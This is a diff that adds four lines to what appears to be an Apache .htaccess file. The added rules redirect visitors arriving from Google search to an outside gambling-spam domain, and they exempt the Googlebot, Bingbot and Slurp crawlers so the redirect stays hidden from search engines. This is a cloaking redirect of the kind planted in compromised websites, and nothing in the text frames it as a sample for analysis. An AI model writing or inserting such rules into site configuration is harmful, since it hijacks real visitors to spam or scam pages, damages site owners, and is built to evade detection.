@@ -1,0 +1,4 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^https?://(www\.)?google\.[a-z.]+ [NC]
+RewriteCond %{HTTP_USER_AGENT} !(Googlebot|Bingbot|Slurp) [NC]
+RewriteRule ^(.*)$ https://slotgacor.rekomendasi.kapalapi.org/sjpublisher/ampmobile/ [R=302,L]
